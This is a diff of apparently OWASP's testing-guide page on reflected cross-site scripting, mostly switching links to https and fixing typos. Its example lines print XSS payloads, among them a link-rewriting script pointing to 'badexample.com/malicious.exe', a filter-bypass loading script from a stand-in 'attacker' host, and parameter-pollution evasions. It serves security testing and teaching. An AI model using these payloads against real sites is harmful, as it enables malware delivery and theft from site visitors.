@@ -78,7 +78,7 @@ The tester must suspect that every data entry point can result in an XSS attack.
 Let's try to click on the following link and see what happens:
 
 ```text
-http://example.com/index.php?user=<script>alert(123)</script>
+https://example.com/index.php?user=<script>alert(123)</script>
 ```
 
 If no sanitization is applied this will result in the following popup:
@@ -93,7 +93,7 @@ This indicates that there is an XSS vulnerability and it appears that the tester
 Let's try other piece of code (link):
 
 ```text
-http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "http://badexample.com/malicious.exe";}</script>
+https://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "https://badexample.com/malicious.exe";}</script>
 ```
 
 This produces the following behavior:
@@ -129,7 +129,7 @@ Then an attacker could submit the following code:
 
 #### Example 4: Different Syntax or Encoding
 
-In some cases it is possible that signature-based filters can be simply defeated by obfuscating the attack. Typically you can do this through the insertion of unexpected variations in the syntax or in the enconding. These variations are tolerated by browsers as valid HTML when the code is returned, and yet they could also be accepted by the filter.
+In some cases it is possible that signature-based filters can be simply defeated by obfuscating the attack. Typically you can do this through the insertion of unexpected variations in the syntax or in the encoding. These variations are tolerated by browsers as valid HTML when the code is returned, and yet they could also be accepted by the filter.
 
 Following some examples:
 
@@ -165,17 +165,17 @@ Now suppose that developers of the target site implemented the following code to
 Decoupling the above regular expression:
 
 1. Check for a `<script`
-2. Check for a " " (white space)
+2. Check for a " " (whitespace)
 3. Any character but the character `>` for one or more occurrences
 4. Check for a `src`
 
-This is useful for filtering expressions like `<script src="http://attacker/xss.js"></script>` which is a common attack. But, in this case, it is possible to bypass the sanitization by using the `>` character in an attribute between script and src, like this:
+This is useful for filtering expressions like `<script src="https://attacker/xss.js"></script>` which is a common attack. But, in this case, it is possible to bypass the sanitization by using the `>` character in an attribute between script and src, like this:
 
 ```text
-http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
+https://example/?var=<SCRIPT%20a=">"%20SRC="https://attacker/xss.js"></SCRIPT>
 ```
 
-This will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker's web server as if it was originating from the victim web site, `http://example/`.
+This will exploit the reflected cross site scripting vulnerability shown before, executing the JavaScript code stored on the attacker's web server as if it was originating from the victim site, `https://example/`.
 
 #### Example 7: HTTP Parameter Pollution (HPP)
 
@@ -183,13 +183,13 @@ Another method to bypass filters is the HTTP Parameter Pollution, this technique
 Regular attack:
 
 ```text
-http://example/page.php?param=<script>[...]</script>
+https://example/page.php?param=<script>[...]</script>
 ```
 
 Attack using HPP:
 
 ```text
-http://example/page.php?param=<script&param=>[...]</&param=script>
+https://example/page.php?param=<script&param=>[...]</&param=script>
 ```
 
 See the [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) for a more detailed list of filter evasion techniques. Finally, analyzing answers can get complex. A simple way to do this is to use code that pops up a dialog, as in our example. This typically indicates that an attacker could execute arbitrary JavaScript of his choice in the visitors' browsers.
@@ -204,10 +204,10 @@ If source code is available (white-box testing), all variables received from use
 
 - [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.
 - [Hackvertor](https://hackvertor.co.uk/public) is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).
-- [XSS-Proxy](http://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
+- [XSS-Proxy](https://xss-proxy.sourceforge.net/) is an advanced Cross-Site-Scripting (XSS) attack tool.
 - [ratproxy](https://code.google.com/archive/p/ratproxy/) is a semi-automated, largely passive web application security audit tool, optimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments.
 - [Burp Proxy](https://portswigger.net/burp/) is an interactive HTTP/S proxy server for attacking and testing web applications.
-- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.
+- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.
 
 ## References
 
@@ -225,5 +225,4 @@ If source code is available (white-box testing), all variables received from use
 
 - [CERT - Malicious HTML Tags Embedded in Client Web Requests](https://resources.sei.cmu.edu/asset_files/WhitePaper/2000_019_001_496188.pdf)
 - [cgisecurity.com - The Cross Site Scripting FAQ](https://www.cgisecurity.com/xss-faq.html)
-- [G.Ollmann - HTML Code Injection and Cross-site scripting](http://www.technicalinfo.net/papers/CSS.html)
 - [S. Frei, T. Dübendorfer, G. Ollmann, M. May - Understanding the Web browser threat](https://www.techzoom.net/Publications/Insecurity-Iceberg)
